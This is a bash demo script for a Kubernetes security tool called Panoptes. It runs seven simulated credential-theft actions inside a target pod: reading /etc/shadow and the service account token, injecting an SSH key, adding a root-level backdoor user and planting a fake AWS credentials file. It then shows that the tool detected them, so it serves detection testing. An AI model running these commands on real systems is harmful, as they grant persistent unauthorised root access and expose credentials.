#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=../lib/demo-common.sh
source "${SCRIPT_DIR}/../lib/demo-common.sh"

# ─── Cleanup ─────────────────────────────────────────────────────────
cleanup() {
    step "Cleaning up credential theft demo resources"

    info "Deleting workload, ArgusWatcher, and JanusGuard..."
    kubectl delete -f "${SCRIPT_DIR}/attacker-simulation.yaml" --ignore-not-found -n "${NAMESPACE}"

    ok "Cleanup complete."
    echo -e "${YELLOW}Note:${NC} Panoptes itself was not uninstalled. Run 'helm uninstall panoptes -n ${PANOPTES_NS}' to remove it."
}

if [[ "${1:-}" == "--cleanup" ]]; then
    cleanup
    exit 0
fi

# ─── Pre-flight check ───────────────────────────────────────────────
panoptes_preflight
panoptes_wait_daemons argusd janusd

# ─── Step 1: Deploy workload with monitoring ─────────────────────────
step "Step 1/4: Deploying target workload with ArgusWatcher and JanusGuard"

demo_deploy "${SCRIPT_DIR}/attacker-simulation.yaml" "deploy/target-workload" "target-workload"

# ─── Step 2: Verify monitoring ──────────────────────────────────────
step "Step 2/4: Verifying credential monitoring is active"

demo_init_watches

info "ArgusWatcher (file modification detection):"
kubectl get aw credential-fim -n "${NAMESPACE}" -o wide 2>/dev/null || warn "ArgusWatcher not yet visible"

info "JanusGuard (file access auditing):"
kubectl get jg credential-access -n "${NAMESPACE}" -o wide 2>/dev/null || warn "JanusGuard not yet visible"

# ─── Step 3: Simulate credential theft ──────────────────────────────
step "Step 3/4: Simulating credential theft attempts"

info "Attack 1: Reading /etc/shadow (password hash extraction)"
kubectl exec "${POD}" -n "${NAMESPACE}" -- cat /etc/shadow 2>/dev/null || true
ok "Attempted: /etc/shadow read"

sleep 1

info "Attack 2: Reading Kubernetes service account token"
kubectl exec "${POD}" -n "${NAMESPACE}" -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || true
ok "Attempted: K8s service account token read"

sleep 1

info "Attack 3: Injecting SSH authorized key"
kubectl exec "${POD}" -n "${NAMESPACE}" -- bash -c "mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@evil.com' > /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys"
ok "Created: /root/.ssh/authorized_keys"

sleep 1

info "Attack 4: Adding backdoor user to /etc/passwd"
kubectl exec "${POD}" -n "${NAMESPACE}" -- bash -c "echo 'backdoor:x:0:0:backdoor:/root:/bin/bash' >> /etc/passwd"
ok "Modified: /etc/passwd (UID 0 user added)"

sleep 1

info "Attack 5: Attempting to read /etc/shadow password hashes"
kubectl exec "${POD}" -n "${NAMESPACE}" -- bash -c "cat /etc/shadow | head -3" 2>/dev/null || true
ok "Attempted: /etc/shadow second read"

sleep 1

info "Attack 6: Modifying /etc/shadow (resetting root password)"
kubectl exec "${POD}" -n "${NAMESPACE}" -- bash -c "chmod 644 /etc/shadow" 2>/dev/null || true
ok "Attempted: /etc/shadow permission change"

sleep 1

info "Attack 7: Creating fake cloud credential file"
kubectl exec "${POD}" -n "${NAMESPACE}" -- bash -c "mkdir -p /root/.aws && echo '[default]
aws_access_key_id=AKIAIOSFODNN7EXAMPLE
aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY' > /root/.aws/credentials"
ok "Created: /root/.aws/credentials"

# ─── Step 4: Show detections ────────────────────────────────────────
step "Step 4/4: Showing detected credential theft events"

demo_propagate

info "ArgusWatcher status (modification detection):"
kubectl get aw credential-fim -n "${NAMESPACE}" -o wide 2>/dev/null || true

echo ""
info "JanusGuard status (access auditing):"
kubectl get jg credential-access -n "${NAMESPACE}" -o wide 2>/dev/null || true

panoptes_show_logs --tail 25 argusd janusd

# ─── Done ────────────────────────────────────────────────────────────
step "Demo complete"

echo -e "
${GREEN}Credential theft attempts detected:${NC}

  ${RED}ArgusWatcher (modification detection):${NC}
    /root/.ssh/authorized_keys   created   (SSH key injection)
    /etc/passwd                  modified  (backdoor user added)
    /etc/shadow                  attrib    (permissions changed)
    /root/.aws/credentials       created   (cloud credential planted)

  ${RED}JanusGuard (access auditing):${NC}
    /etc/shadow                  open      (password hash read)
    /var/run/secrets/.../token   open      (K8s token read)

${GREEN}Defense in depth:${NC}
  ArgusWatcher detects writes, JanusGuard detects reads.
  Together they provide complete credential file visibility.

${YELLOW}Next step -- enable enforcement to BLOCK credential access:${NC}
  kubectl patch jg credential-access -p '{\"spec\":{\"enforcing\":true}}'

${YELLOW}To clean up:${NC}
  ${SCRIPT_DIR}/demo.sh --cleanup
"
